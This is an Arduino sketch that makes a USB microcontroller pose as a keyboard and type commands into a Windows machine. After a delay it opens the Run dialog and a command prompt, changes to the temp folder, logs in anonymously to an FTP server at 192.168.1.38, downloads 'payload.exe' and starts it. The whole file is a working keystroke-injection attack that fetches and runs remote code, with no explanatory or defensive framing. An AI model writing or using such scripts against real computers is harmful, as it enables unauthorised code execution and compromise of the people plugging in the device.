#include<HID-Project.h>
void setup(){
  Keyboard.begin();
  delay(10000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("cmd.exe");
  delay(500);
  Keyboard.println("cd %temp%");
  delay(100);
  Keyboard.println("ftp 192.168.1.38");
  delay(100);
  Keyboard.println("anonymous");
  delay(100);
  Keyboard.println();
  delay(100);
  Keyboard.println("binary");
  delay(100);
  Keyboard.println("get payload.exe");
  delay(300);
  Keyboard.println("bye");
  delay(100);
  Keyboard.println("start payload.exe");
  Keyboard.println("exit");
  Keyboard.end();
}

void loop(){}
